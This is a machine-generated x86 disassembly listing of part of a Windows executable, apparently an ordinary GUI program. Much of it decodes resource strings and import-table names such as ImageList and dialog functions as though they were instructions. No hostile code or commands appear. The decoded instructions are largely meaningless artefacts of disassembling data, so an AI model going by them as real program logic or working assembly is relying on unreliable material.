  4280ec:	add    BYTE PTR [ecx+0x0],ah
  4280ef:	jns    0x4280f1
  4280f1:	jbe    0x4280f3
  4280f3:	popa   
  4280f4:	add    BYTE PTR [esi+0x0],ch
  4280f7:	popa   
  4280f8:	add    BYTE PTR [edi+0x0],ah
  4280fb:	outs   dx,DWORD PTR ds:[esi]
  4280fc:	add    BYTE PTR [eax],al
  4280fe:	add    BYTE PTR [edi+0x0],ch
  428101:	jb     0x428103
  428103:	jae    0x428105
  428105:	imul   eax,DWORD PTR [eax],0x47006e
  42810b:	imul   eax,DWORD PTR [eax],0x70006d
  428111:	bound  eax,QWORD PTR [eax]
  428113:	outs   dx,DWORD PTR ds:[esi]
  428114:	add    BYTE PTR [eax+0x0],dh
  428117:	imul   eax,DWORD PTR [eax],0x650000
  42811d:	js     0x42811f
  42811f:	jae    0x428121
  428121:	outs   dx,DWORD PTR ds:[esi]
  428122:	add    BYTE PTR [ebx+0x0],dh
  428125:	popa   
  428126:	add    BYTE PTR [esi+0x0],ch
  428129:	je     0x42812b
  42812b:	add    BYTE PTR [eax],al
  42812d:	bound  eax,QWORD PTR [eax]
  42812f:	jns    0x428131
  428131:	add    BYTE PTR gs:[eax+eax*1+0x61],ch
  428136:	add    BYTE PTR [eax+eax*1+0x74],ah
  42813a:	add    BYTE PTR [ecx+0x0],ah
  42813d:	add    BYTE PTR [eax],al
  42813f:	js     0x428141
  428141:	imul   eax,DWORD PTR [eax],0x610054
  428147:	imul   eax,DWORD PTR [eax],0x48006e
  42814d:	popa   
  42814e:	add    BYTE PTR [esi+0x0],ch
  428151:	add    BYTE PTR fs:[eax],al
  428154:	add    BYTE PTR [edi+0x0],cl
  428157:	ja     0x428159
  428159:	ins    BYTE PTR es:[edi],dx
  42815a:	add    BYTE PTR [ebx+0x0],dh
  42815d:	popa   
  42815e:	add    BYTE PTR [ebx+0x0],dh
  428161:	jo     0x428163
  428163:	popa   
  428164:	add    BYTE PTR [ecx+0x0],ch
  428167:	imul   eax,DWORD PTR [eax],0x72
  42816a:	add    BYTE PTR [ebp+0x0],ah
  42816d:	jbe    0x42816f
  42816f:	add    BYTE PTR [eax],al
  428171:	jb     0x428173
  428173:	jne    0x428175
  428175:	je     0x428177
  428177:	ins    DWORD PTR es:[edi],dx
  428178:	add    BYTE PTR [ebp+0x0],dh
  42817b:	arpl   WORD PTR [eax],ax
  42817d:	jne    0x42817f
  42817f:	jo     0x428181
  428181:	add    BYTE PTR [eax],al
  428183:	jae    0x428185
  428185:	outs   dx,DWORD PTR ds:[esi]
  428186:	add    BYTE PTR [esi+0x0],ah
  428189:	imul   eax,DWORD PTR [eax],0x630062
  42818f:	outs   dx,DWORD PTR ds:[esi]
  428190:	add    BYTE PTR [ecx+0x0],ch
  428193:	jb     0x428195
  428195:	jae    0x428197
  428197:	outs   dx,DWORD PTR ds:[esi]
  428198:	add    BYTE PTR [eax],al
  42819a:	add    BYTE PTR [ebx+0x0],dl
  42819d:	outs   dx,DWORD PTR ds:[esi]
  42819e:	add    BYTE PTR [ebx+0x0],ah
  4281a1:	popa   
  4281a2:	add    BYTE PTR [ecx+0x0],ch
  4281a5:	jae    0x4281a7
  4281a7:	data16 add BYTE PTR [ecx+0x0],ah
  4281ab:	jb     0x4281ad
  4281ad:	popa   
  4281ae:	add    BYTE PTR [ecx+0x0],ch
  4281b1:	add    BYTE PTR [eax],al
  4281b3:	add    BYTE PTR [esi],cl
  4281b5:	adc    BYTE PTR [eax],al
  4281b7:	out    0x67,eax
  4281b9:	adc    BYTE PTR [eax],al
  4281bb:	js     0x4281e4
  4281bd:	adc    BYTE PTR [eax],al
  4281bf:	test   al,0x13
  4281c1:	adc    BYTE PTR [eax],al
  4281c3:	fs push esi
  4281c5:	adc    BYTE PTR [eax],al
  4281c7:	jp     0x4281e9
  4281c9:	adc    BYTE PTR [eax],al
  4281cb:	enter  0x1052,0x0
  4281cf:	loop   0x428244
  4281d1:	adc    BYTE PTR [eax],al
  4281d3:	ja     0x428240
  4281d5:	adc    BYTE PTR [eax],al
  4281d7:	cmp    al,0x2b
  4281d9:	adc    BYTE PTR [eax],al
  4281db:	rcl    BYTE PTR [edx],1
  4281dd:	adc    BYTE PTR [eax],al
  4281df:	sbb    DWORD PTR [eax+0x10],ebx
  4281e2:	add    BYTE PTR [esi],ah
  4281e4:	add    dl,BYTE PTR [eax]
  4281e6:	add    BYTE PTR [edi+0xc],dh
  4281e9:	adc    BYTE PTR [eax],al
  4281eb:	mov    dh,BYTE PTR [ecx]
  4281ed:	adc    BYTE PTR [eax],al
  4281ef:	out    dx,al
  4281f0:	sbb    eax,0xed80010
  4281f5:	adc    BYTE PTR [eax],al
  4281f7:	add    eax,0x3300107f
  4281fc:	jbe    0x42820e
  4281fe:	add    BYTE PTR [ebx-0x48ffbd7f],dh
  428204:	add    DWORD PTR [edx+0x0],0x4281bb
  42820b:	mov    edi,0xc3004281
  428210:	add    DWORD PTR [edx+0x0],0x4281c7
  428217:	retf   
  428218:	add    DWORD PTR [edx+0x0],0x4281cf
  42821f:	rol    DWORD PTR [ecx-0x7e28ffbe],cl
  428225:	inc    edx
  428226:	add    bl,bl
  428228:	add    DWORD PTR [edx+0x0],0x4281df
  42822f:	jecxz  0x4281b2
  428231:	inc    edx
  428232:	add    bh,ah
  428234:	add    DWORD PTR [edx+0x0],0x4281eb
  42823b:	out    dx,eax
  42823c:	add    DWORD PTR [edx+0x0],0x4281f3
  428243:	test   DWORD PTR [ecx-0x7e04ffbe],0x828b0042
  42824d:	inc    edx
  42824e:	add    BYTE PTR [edi-0x6cffbd7e],cl
  428254:	add    BYTE PTR [edx+0x0],0x97
  428258:	add    BYTE PTR [edx+0x0],0x9b
  42825c:	add    BYTE PTR [edx+0x0],0x9f
  428260:	add    BYTE PTR [edx+0x0],0xa3
  428264:	add    BYTE PTR [edx+0x0],0xa7
  428268:	add    BYTE PTR [edx+0x0],0xab
  42826c:	add    BYTE PTR [edx+0x0],0xaf
  428270:	add    BYTE PTR [edx+0x0],0xb3
  428274:	add    BYTE PTR [edx+0x0],0xb7
  428278:	add    BYTE PTR [edx+0x0],0xbb
  42827c:	add    BYTE PTR [edx+0x0],0xbf
  428280:	add    BYTE PTR [edx+0x0],0xc3
  428284:	add    BYTE PTR [edx+0x0],0xc7
  428288:	add    BYTE PTR [edx+0x0],0x29
  42828c:	or     al,0x10
  42828e:	add    BYTE PTR [edx-0x57ffefc2],dl
  428294:	push   edi
  428295:	adc    BYTE PTR [eax],al
  428297:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428298:	outs   dx,DWORD PTR ds:[esi]
  428299:	adc    BYTE PTR [eax],al
  42829b:	push   ebx
  42829c:	popa   
  42829d:	adc    BYTE PTR [eax],al
  42829f:	add    dh,BYTE PTR [ebp+0x10]
  4282a2:	add    dh,cl
  4282a4:	jle    0x4282b6
  4282a6:	add    BYTE PTR [esi+edx*2],dl
  4282a9:	adc    BYTE PTR [eax],al
  4282ab:	mov    al,0x68
  4282ad:	adc    BYTE PTR [eax],al
  4282af:	aas    
  4282b0:	inc    esp
  4282b1:	adc    BYTE PTR [eax],al
  4282b3:	pop    ebp
  4282b4:	and    DWORD PTR [eax],edx
  4282b6:	add    bl,dl
  4282b8:	jl     0x4282ca
  4282ba:	add    BYTE PTR [edx+0xb],dh
  4282bd:	adc    BYTE PTR [eax],al
  4282bf:	inc    edx
  4282c0:	push   eax
  4282c1:	adc    BYTE PTR [eax],al
  4282c3:	mov    ebp,0xbb001074
  4282c8:	pop    ds
  4282c9:	adc    BYTE PTR [eax],al
  4282cb:	sub    DWORD PTR [eax+0x10],eax
  4282ce:	add    BYTE PTR [ecx],dh
  4282d0:	ja     0x4282e2
  4282d2:	add    bl,dl
  4282d4:	sbb    dl,BYTE PTR [eax]
  4282d6:	add    BYTE PTR [esi+0x1e],ch
  4282d9:	adc    BYTE PTR [eax],al
  4282db:	or     ch,BYTE PTR [esi]
  4282dd:	adc    BYTE PTR [eax],al
  4282df:	sbb    eax,0xa100103e
  4282e4:	data16 adc BYTE PTR [eax],al
  4282e7:	xchg   ecx,eax
  4282e8:	bound  edx,QWORD PTR [eax]
  4282ea:	add    BYTE PTR [esi],bh
  4282ec:	dec    edi
  4282ed:	adc    BYTE PTR [eax],al
  4282ef:	in     eax,dx
  4282f0:	adc    BYTE PTR fs:[eax],al
  4282f3:	sub    bl,BYTE PTR [ecx+0x10]
  4282f6:	add    BYTE PTR [esi+0x43],al
  4282f9:	adc    BYTE PTR [eax],al
  4282fb:	imul   edi,DWORD PTR [eax+edx*1],0x0
  4282ff:	rol    BYTE PTR [esi+0x10],0x0
  428303:	in     eax,0x31
  428305:	adc    BYTE PTR [eax],al
  428307:	mov    esp,0xcb00104f
  42830c:	add    BYTE PTR [edx+0x0],0xcf
  428310:	add    BYTE PTR [edx+0x0],0xd3
  428314:	add    BYTE PTR [edx+0x0],0xd7
  428318:	add    BYTE PTR [edx+0x0],0xdb
  42831c:	add    BYTE PTR [edx+0x0],0xdf
  428320:	add    BYTE PTR [edx+0x0],0xe3
  428324:	add    BYTE PTR [edx+0x0],0xe7
  428328:	add    BYTE PTR [edx+0x0],0xeb
  42832c:	add    BYTE PTR [edx+0x0],0xef
  428330:	add    BYTE PTR [edx+0x0],0xf3
  428334:	add    BYTE PTR [edx+0x0],0xf7
  428338:	add    BYTE PTR [edx+0x0],0xfb
  42833c:	add    BYTE PTR [edx+0x0],0xff
  428340:	add    BYTE PTR [edx+0x0],0x3
  428344:	add    DWORD PTR [edx+0x0],0x7
  428348:	add    DWORD PTR [edx+0x0],0xffffffe1
  42834c:	and    dl,BYTE PTR [eax]
  42834e:	add    bh,bh
  428350:	push   ecx
  428351:	adc    BYTE PTR [eax],al
  428353:	test   BYTE PTR ds:0x1d0c0010,0x10
  42835a:	add    BYTE PTR [ebx],al
  42835c:	sbb    dl,BYTE PTR [eax]
  42835e:	add    ch,ah
  428360:	or     dl,BYTE PTR [eax]
  428362:	add    BYTE PTR [edi+0x42001035],bl
  428368:	pop    edi
  428369:	adc    BYTE PTR [eax],al
  42836b:	adc    eax,0xd300103f
  428370:	cmp    dl,BYTE PTR [eax]
  428372:	add    BYTE PTR [ebp+0x1001021],ah
  428378:	sbb    al,0x10
  42837a:	add    BYTE PTR [ebx-0x1effefd7],ch
  428380:	adc    BYTE PTR cs:[eax],al
  428383:	push   eax
  428384:	adc    BYTE PTR [bx+si],al
  428387:	mov    edi,0x4b00102d
  42838c:	add    DWORD PTR [edx+0x0],0x4f
  428390:	add    DWORD PTR [edx+0x0],0x53
  428394:	add    DWORD PTR [edx+0x0],0x57
  428398:	add    DWORD PTR [edx+0x0],0x5b
  42839c:	add    DWORD PTR [edx+0x0],0x5f
  4283a0:	add    DWORD PTR [edx+0x0],0x63
  4283a4:	add    DWORD PTR [edx+0x0],0x67
  4283a8:	add    DWORD PTR [edx+0x0],0x6b
  4283ac:	add    DWORD PTR [edx+0x0],0x6f
  4283b0:	add    DWORD PTR [edx+0x0],0x73
  4283b4:	add    DWORD PTR [edx+0x0],0x77
  4283b8:	add    DWORD PTR [edx+0x0],0x7b
  4283bc:	add    DWORD PTR [edx+0x0],0x7f
  4283c0:	add    DWORD PTR [edx+0x0],0xffffff83
  4283c4:	add    DWORD PTR [edx+0x0],0xffffff87
  4283c8:	add    DWORD PTR [edx+0x0],0xffffff98
  4283cc:	pusha  
  4283cd:	adc    BYTE PTR [eax],al
  4283cf:	pop    ebp
  4283d0:	js     0x4283e2
  4283d2:	add    BYTE PTR [esi],bh
  4283d4:	dec    eax
  4283d5:	adc    BYTE PTR [eax],al
  4283d7:	cmp    al,0x7a
  4283d9:	adc    BYTE PTR [eax],al
  4283db:	aam    0x9
  4283dd:	adc    BYTE PTR [eax],al
  4283df:	or     cl,BYTE PTR [ebx]
  4283e1:	adc    BYTE PTR [eax],al
  4283e3:	pop    ebx
  4283e4:	push   ebp
  4283e5:	adc    BYTE PTR [eax],al
  4283e7:	mov    esi,0x6001032
  4283ec:	xor    edx,DWORD PTR [eax]
  4283ee:	add    BYTE PTR [esi-0x16ffefc0],al
  4283f4:	and    eax,0x61460010
  4283f9:	adc    BYTE PTR [eax],al
  4283fb:	adc    DWORD PTR [ebp+0x10],ebp
  4283fe:	add    al,al
  428400:	dec    esi
  428401:	adc    BYTE PTR [eax],al
  428403:	jae    0x428423
  428405:	adc    BYTE PTR [eax],al
  428407:	dec    ebx
  428408:	add    eax,0x83cb0010
  42840d:	inc    edx
  42840e:	add    bh,cl
  428410:	add    DWORD PTR [edx+0x0],0xffffffd3
  428414:	add    DWORD PTR [edx+0x0],0xffffffd7
  428418:	add    DWORD PTR [edx+0x0],0xffffffdb
  42841c:	add    DWORD PTR [edx+0x0],0xffffffdf
  428420:	add    DWORD PTR [edx+0x0],0xffffffe3
  428424:	add    DWORD PTR [edx+0x0],0xffffffe7
  428428:	add    DWORD PTR [edx+0x0],0xffffffeb
  42842c:	add    DWORD PTR [edx+0x0],0xffffffef
  428430:	add    DWORD PTR [edx+0x0],0xfffffff3
  428434:	add    DWORD PTR [edx+0x0],0xfffffff7
  428438:	add    DWORD PTR [edx+0x0],0xfffffffb
  42843c:	add    DWORD PTR [edx+0x0],0xffffffff
  428440:	add    DWORD PTR [edx+0x0],0x3
  428444:	test   BYTE PTR [edx+0x0],al
  428447:	pop    es
  428448:	test   BYTE PTR [edx+0x0],al
	...
  428453:	add    BYTE PTR [edx],bh
  428455:	jno    0x4284a9
  428457:	dec    edi
  428458:	add    BYTE PTR [eax],al
  42845a:	add    BYTE PTR [eax],al
  42845c:	mov    al,0x8d
  42845e:	add    al,BYTE PTR [eax]
  428460:	add    DWORD PTR [eax],eax
  428462:	add    BYTE PTR [eax],al
  428464:	add    DWORD PTR [eax],eax
  428466:	add    BYTE PTR [eax],al
  428468:	add    DWORD PTR [eax],eax
  42846a:	add    BYTE PTR [eax],al
  42846c:	or     BYTE PTR [ebp-0x725ffffe],0x2
  428473:	add    BYTE PTR [eax+0x28d],dl
	...
  428481:	add    BYTE PTR [eax],al
  428483:	add    BYTE PTR [eax-0x7a],cl
  428486:	add    al,BYTE PTR [eax]
  428488:	xchg   BYTE PTR fs:[edx],al
  42848b:	add    BYTE PTR [esi-0x7a],dh
  42848e:	add    al,BYTE PTR [eax]
  428490:	mov    BYTE PTR [esi-0x795ffffe],al
  428496:	add    al,BYTE PTR [eax]
  428498:	mov    ah,0x86
  42849a:	add    al,BYTE PTR [eax]
  42849c:	into   
  42849d:	xchg   BYTE PTR [edx],al
  42849f:	add    BYTE PTR [eax],al
  4284a1:	add    BYTE PTR [eax],al
  4284a3:	add    al,dh
  4284a5:	xchg   BYTE PTR [edx],al
  4284a7:	add    BYTE PTR [esi],cl
  4284a9:	xchg   DWORD PTR [edx],eax
  4284ab:	add    BYTE PTR [edi+eax*4],bl
  4284ae:	add    al,BYTE PTR [eax]
  4284b0:	sub    al,BYTE PTR [edi-0x78c1fffe]
  4284b6:	add    al,BYTE PTR [eax]
  4284b8:	dec    esp
  4284b9:	xchg   DWORD PTR [edx],eax
  4284bb:	add    BYTE PTR [esi-0x79],bl
  4284be:	add    al,BYTE PTR [eax]
  4284c0:	jo     0x428449
  4284c2:	add    al,BYTE PTR [eax]
  4284c4:	jle    0x42844d
  4284c6:	add    al,BYTE PTR [eax]
  4284c8:	nop
  4284c9:	xchg   DWORD PTR [edx],eax
  4284cb:	add    BYTE PTR [edx-0x4ffffd79],ah
  4284d1:	xchg   DWORD PTR [edx],eax
  4284d3:	add    BYTE PTR [esi-0x2ffffd79],bh
  4284d9:	xchg   DWORD PTR [edx],eax
  4284db:	add    ah,bl
  4284dd:	xchg   DWORD PTR [edx],eax
  4284df:	add    dl,dh
  4284e1:	xchg   DWORD PTR [edx],eax
  4284e3:	add    BYTE PTR [eax+ecx*4],al
  4284e6:	add    al,BYTE PTR [eax]
  4284e8:	push   ss
  4284e9:	mov    BYTE PTR [edx],al
  4284eb:	add    BYTE PTR [edx],ah
  4284ed:	mov    BYTE PTR [edx],al
  4284ef:	add    BYTE PTR [edx],dh
  4284f1:	mov    BYTE PTR [edx],al
  4284f3:	add    BYTE PTR [edx-0x78],al
  4284f6:	add    al,BYTE PTR [eax]
  4284f8:	pop    eax
  4284f9:	mov    BYTE PTR [edx],al
  4284fb:	add    BYTE PTR [eax+ecx*4+0x2],ah
  4284ff:	add    BYTE PTR [esi-0x78],dh
  428502:	add    al,BYTE PTR [eax]
  428504:	mov    WORD PTR [eax-0x7761fffe],cs
  42850a:	add    al,BYTE PTR [eax]
  42850c:	lods   al,BYTE PTR ds:[esi]
  42850d:	mov    BYTE PTR [edx],al
  42850f:	add    BYTE PTR [eax+ecx*4-0x7731fffe],bh
  428516:	add    al,BYTE PTR [eax]
  428518:	loop   0x4284a2
  42851a:	add    al,BYTE PTR [eax]
  42851c:	clc    
  42851d:	mov    BYTE PTR [edx],al
  42851f:	add    BYTE PTR [edx],cl
  428521:	mov    DWORD PTR [edx],eax
  428523:	add    BYTE PTR [ecx+ecx*4],bl
  428526:	add    al,BYTE PTR [eax]
  428528:	sub    al,0x89
  42852a:	add    al,BYTE PTR [eax]
  42852c:	cmp    al,0x89
  42852e:	add    al,BYTE PTR [eax]
  428530:	dec    esp
  428531:	mov    DWORD PTR [edx],eax
  428533:	add    BYTE PTR [esi-0x77],bl
  428536:	add    al,BYTE PTR [eax]
  428538:	ins    BYTE PTR es:[edi],dx
  428539:	mov    DWORD PTR [edx],eax
  42853b:	add    BYTE PTR [edx-0x77],bh
  42853e:	add    al,BYTE PTR [eax]
  428540:	xchg   edx,eax
  428541:	mov    DWORD PTR [edx],eax
  428543:	add    BYTE PTR [ecx+ecx*4-0x7649fffe],ah
  42854a:	add    al,BYTE PTR [eax]
  42854c:	ret    0x289
  42854f:	add    dh,cl
  428551:	mov    DWORD PTR [edx],eax
  428553:	add    dl,bl
  428555:	mov    DWORD PTR [edx],eax
  428557:	add    dl,ch
  428559:	mov    DWORD PTR [edx],eax
  42855b:	add    BYTE PTR [eax],al
  42855d:	mov    al,BYTE PTR [edx]
  42855f:	add    BYTE PTR [esi],cl
  428561:	mov    al,BYTE PTR [edx]
  428563:	add    BYTE PTR [eax],ah
  428565:	mov    al,BYTE PTR [edx]
  428567:	add    BYTE PTR [edx],dh
  428569:	mov    al,BYTE PTR [edx]
  42856b:	add    BYTE PTR [eax],al
  42856d:	add    BYTE PTR [eax],al
  42856f:	add    BYTE PTR [edx+ecx*4+0x2],cl
  428573:	add    BYTE PTR [eax],al
  428575:	add    BYTE PTR [eax],al
  428577:	add    BYTE PTR [edx-0x76],ch
  42857a:	add    al,BYTE PTR [eax]
  42857c:	jl     0x428508
  42857e:	add    al,BYTE PTR [eax]
  428580:	mov    cs,WORD PTR [edx-0x755bfffe]
  428586:	add    al,BYTE PTR [eax]
  428588:	mov    dh,0x8a
  42858a:	add    al,BYTE PTR [eax]
  42858c:	enter  0x28a,0x0
  428590:	fmul   DWORD PTR [edx-0x7509fffe]
  428596:	add    al,BYTE PTR [eax]
  428598:	push   es
  428599:	mov    eax,DWORD PTR [edx]
  42859b:	add    BYTE PTR [ebx+ecx*4],dl
  42859e:	add    al,BYTE PTR [eax]
  4285a0:	and    al,0x8b
  4285a2:	add    al,BYTE PTR [eax]
  4285a4:	xor    cl,BYTE PTR [ebx-0x74bdfffe]
  4285aa:	add    al,BYTE PTR [eax]
  4285ac:	dec    esi
  4285ad:	mov    eax,DWORD PTR [edx]
  4285af:	add    BYTE PTR [eax-0x75],ah
  4285b2:	add    al,BYTE PTR [eax]
  4285b4:	jb     0x428541
  4285b6:	add    al,BYTE PTR [eax]
  4285b8:	mov    BYTE PTR [ebx-0x7469fffe],cl
  4285be:	add    al,BYTE PTR [eax]
  4285c0:	mov    ds:0xbc00028b,al
  4285c5:	mov    eax,DWORD PTR [edx]
  4285c7:	add    ah,dl
  4285c9:	mov    eax,DWORD PTR [edx]
  4285cb:	add    ah,ch
  4285cd:	mov    eax,DWORD PTR [edx]
  4285cf:	add    dl,bh
  4285d1:	mov    eax,DWORD PTR [edx]
  4285d3:	add    BYTE PTR [esi],al
  4285d5:	mov    WORD PTR [edx],es
  4285d7:	add    BYTE PTR [eax],bl
  4285d9:	mov    WORD PTR [edx],es
  4285db:	add    BYTE PTR [eax],al
  4285dd:	add    BYTE PTR [eax],al
  4285df:	add    BYTE PTR [eax],bh
  4285e1:	mov    WORD PTR [edx],es
  4285e3:	add    BYTE PTR [edx-0x74],al
  4285e6:	add    al,BYTE PTR [eax]
  4285e8:	push   eax
  4285e9:	mov    WORD PTR [edx],es
  4285eb:	add    BYTE PTR [esp+ecx*4+0x2],bl
  4285ef:	add    BYTE PTR [esp+ecx*4+0x2],ch
  4285f3:	add    BYTE PTR [edx-0x74],bh
  4285f6:	add    al,BYTE PTR [eax]
  4285f8:	xchg   BYTE PTR [edx+eax*1+0x28c9000],cl
  4285ff:	add    BYTE PTR [edx-0x47fffd74],ah
  428605:	mov    WORD PTR [edx],es
  428607:	add    dh,cl
  428609:	mov    WORD PTR [edx],es
  42860b:	add    ah,ah
  42860d:	mov    WORD PTR [edx],es
  42860f:	add    ah,dh
  428611:	mov    WORD PTR [edx],es
  428613:	add    BYTE PTR [ecx*4-0x72ebfffe],al
  42861a:	add    al,BYTE PTR [eax]
  42861c:	and    cl,BYTE PTR [ebp-0x72c5fffe]
  428622:	add    al,BYTE PTR [eax]
  428624:	inc    esp
  428625:	lea    eax,[edx]
  428627:	add    BYTE PTR [eax-0x73],dl
  42862a:	add    al,BYTE PTR [eax]
  42862c:	pop    esi
  42862d:	lea    eax,[edx]
	...
  42863f:	add    BYTE PTR [ebx+0x6d],ah
  428642:	fs cs gs js 0x4286ac
  428647:	add    BYTE PTR [edi],dl
  428649:	add    BYTE PTR [ebp+eiz*2+0x73],al
  42864d:	je     0x4286c1
  42864f:	outs   dx,DWORD PTR ds:[esi]
  428650:	jns    0x4286a2
  428652:	jb     0x4286c3
  428654:	jo     0x4286bb
  428656:	jb     0x4286cc
  428658:	jns    0x4286ad
  42865a:	push   0x50746565
  42865f:	popa   
  428660:	add    BYTE PTR gs:[bx+si],al
  428664:	pop    esp
  428665:	add    BYTE PTR [eax+0x72],dl
  428668:	outs   dx,DWORD PTR ds:[esi]
  428669:	jo     0x4286d0
  42866b:	jb     0x4286e1
  42866d:	jns    0x4286c2
  42866f:	push   0x57746565
  428674:	add    BYTE PTR [eax],al
  428676:	pop    ebx
  428677:	add    BYTE PTR [eax+0x72],dl
  42867a:	outs   dx,DWORD PTR ds:[esi]
  42867b:	jo     0x4286e2
  42867d:	jb     0x4286f3
  42867f:	jns    0x4286d4
  428681:	push   0x41746565
  428686:	add    BYTE PTR [eax],al
  428688:	dec    esi
  428689:	add    BYTE PTR [ecx+0x6d],cl
  42868c:	popa   
  42868d:	addr16 gs dec esp
  428690:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  428697:	ins    BYTE PTR es:[edi],dx
  428698:	popa   
  428699:	arpl   WORD PTR [ebp+0x49],sp
  42869c:	arpl   WORD PTR [edi+0x6e],bp
  42869f:	add    BYTE PTR [ecx],dh
  4286a1:	add    BYTE PTR [ecx+0x6d],cl
  4286a4:	popa   
  4286a5:	addr16 gs dec esp
  4286a8:	imul   esi,DWORD PTR [ebx+0x74],0x7365445f
  4286af:	je     0x428723
  4286b1:	outs   dx,DWORD PTR ds:[esi]
  4286b2:	jns    0x4286b4
  4286b4:	inc    eax
  4286b5:	add    BYTE PTR [ecx+0x6d],cl
  4286b8:	popa   
  4286b9:	addr16 gs dec esp
  4286bc:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  4286c3:	dec    ecx
  4286c4:	ins    DWORD PTR es:[edi],dx
  4286c5:	popa   
  4286c6:	addr16 gs inc ebx
  4286c9:	outs   dx,DWORD PTR ds:[esi]
  4286ca:	jne    0x42873a
  4286cc:	je     0x4286ce
  4286ce:	dec    esp
  4286cf:	add    BYTE PTR [ecx+0x6d],cl
  4286d2:	popa   
  4286d3:	addr16 gs dec esp
  4286d6:	imul   esi,DWORD PTR [ebx+0x74],0x6d65525f
  4286dd:	outs   dx,DWORD PTR ds:[esi]
  4286de:	jbe    0x428745
  4286e0:	add    BYTE PTR [eax],al
  4286e2:	inc    ebx
  4286e3:	dec    edi
  4286e4:	dec    ebp
  4286e5:	inc    ebx
  4286e6:	push   esp
  4286e7:	dec    esp
  4286e8:	xor    esi,DWORD PTR [edx]
  4286ea:	cs fs ins BYTE PTR es:[edi],dx
  4286ed:	ins    BYTE PTR es:[edi],dx
  4286ee:	add    BYTE PTR [eax],al
  4286f0:	push   edi
  4286f1:	add    BYTE PTR [ebx+0x72],al
  4286f4:	gs popa 
  4286f6:	je     0x42875d
  4286f8:	inc    esp
  4286f9:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  428700:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  428708:	jb     0x42876b
  42870a:	ins    DWORD PTR es:[edi],dx
  42870b:	push   edi
  42870c:	add    BYTE PTR [eax],al
  42870e:	xor    al,BYTE PTR [edx]
  428710:	push   ebx
  428711:	gs je  0x428757
  428714:	popa   
  428715:	jb     0x42877c
  428717:	je     0x428769
  428719:	outs   dx,DWORD PTR ds:[esi]
  42871a:	jae    0x42871c
  42871c:	cmp    al,BYTE PTR [ecx]
  42871e:	inc    edi
  42871f:	gs je  0x42876f
  428722:	gs jae 0x428798
  428725:	popa   
  428726:	addr16 gs inc ecx
  428729:	add    BYTE PTR [edx+0x61724400],dh
  42872f:	ja     0x428777
  428731:	jb     0x428794
  428733:	ins    DWORD PTR es:[edi],dx
  428734:	gs inc ebx
  428736:	outs   dx,DWORD PTR ds:[esi]
  428737:	outs   dx,BYTE PTR ds:[esi]
  428738:	je     0x4287ac
  42873a:	outs   dx,DWORD PTR ds:[esi]
  42873b:	ins    BYTE PTR es:[edi],dx
  42873c:	add    BYTE PTR [eax],al
  42873e:	sbb    BYTE PTR [ecx],al
  428740:	inc    edi
  428741:	gs je  0x42878d
  428744:	arpl   WORD PTR [edi+0x6e],bp
  428747:	dec    ecx
  428748:	outs   dx,BYTE PTR ds:[esi]
  428749:	outs   dx,WORD PTR ds:[esi]
  42874b:	add    bl,bh
  42874d:	add    dl,BYTE PTR [edx+esi*2+0x61]
  428751:	arpl   WORD PTR [ebx+0x50],bp
  428754:	outs   dx,DWORD PTR ds:[esi]
  428755:	jo     0x4287cc
  428757:	jo     0x4287a6
  428759:	outs   dx,BYTE PTR gs:[esi]
  42875b:	jne    0x42875d
  42875d:	add    cl,bl
  42875f:	add    DWORD PTR [ebp+0x6f],ecx
  428762:	outs   dx,BYTE PTR ds:[esi]
  428763:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  42876b:	push   edx
  42876c:	arpl   WORD PTR gs:[eax+eax*1+0x39],si
  428771:	add    BYTE PTR [ebx+0x68],al
  428774:	popa   
  428775:	jb     0x4287cc
  428777:	jo     0x4287e9
  428779:	gs jb  0x4287d3
  42877c:	add    BYTE PTR [eax],al
  42877e:	add    dl,BYTE PTR ds:[ebx+0x65]
  428782:	je     0x4287c8
  428784:	ins    BYTE PTR es:[edi],dx
  428785:	addr16 dec ecx
  428787:	je     0x4287ee
  428789:	ins    DWORD PTR es:[edi],dx
  42878a:	push   esp
  42878b:	gs js  0x428802
  42878e:	inc    ecx
  42878f:	add    BYTE PTR [edx+eax*1+0x53],bh
  428793:	push   0x774f776f
  428798:	outs   dx,BYTE PTR ds:[esi]
  428799:	gs fs push eax
  42879c:	outs   dx,DWORD PTR ds:[esi]
  42879d:	jo     0x428814
  42879f:	jo     0x428814
  4287a1:	add    BYTE PTR [eax],bl
  4287a3:	add    dl,BYTE PTR [edx+0x65]
  4287a6:	ins    DWORD PTR es:[edi],dx
  4287a7:	outs   dx,DWORD PTR ds:[esi]
  4287a8:	jbe    0x42880f
  4287aa:	push   eax
  4287ab:	jb     0x42881c
  4287ad:	jo     0x428806
  4287af:	add    BYTE PTR [edi+0x2],bh
  4287b2:	push   ebx
  4287b3:	push   0x6957776f
  4287b8:	outs   dx,BYTE PTR ds:[esi]
  4287b9:	outs   dx,DWORD PTR fs:[esi]
  4287bb:	ja     0x4287bd
  4287bd:	add    BYTE PTR [ebx],bl
  4287bf:	add    BYTE PTR [ebx+0x61],al
  4287c2:	ins    BYTE PTR es:[edi],dx
  4287c3:	ins    BYTE PTR es:[edi],dx
  4287c4:	push   edi
  4287c5:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  4287cc:	outs   dx,DWORD PTR ds:[esi]
  4287cd:	arpl   WORD PTR [edi+0x0],dx
  4287d0:	mov    dh,0x1
  4287d2:	dec    esp
  4287d3:	outs   dx,DWORD PTR ds:[esi]
  4287d4:	popa   
  4287d5:	fs dec ebp
  4287d7:	outs   dx,BYTE PTR gs:[esi]
  4287d9:	jne    0x42881c
  4287db:	add    BYTE PTR [edx+eax*1+0x74697753],al
  4287e2:	arpl   WORD PTR [eax+0x54],bp
  4287e5:	outs   dx,DWORD PTR ds:[esi]
  4287e6:	push   esp
  4287e7:	push   0x69577369
  4287ec:	outs   dx,BYTE PTR ds:[esi]
  4287ed:	outs   dx,DWORD PTR fs:[esi]
  4287ef:	ja     0x4287f1
  4287f1:	add    BYTE PTR [eax],ah
  4287f3:	add    dl,BYTE PTR [ebx+0x63]
  4287f6:	jb     0x428867
  4287f8:	ins    BYTE PTR es:[edi],dx
  4287f9:	ins    BYTE PTR es:[edi],dx
  4287fa:	push   edi
  4287fb:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  428802:	add    BYTE PTR [eax],al
  428804:	pop    DWORD PTR [eax]
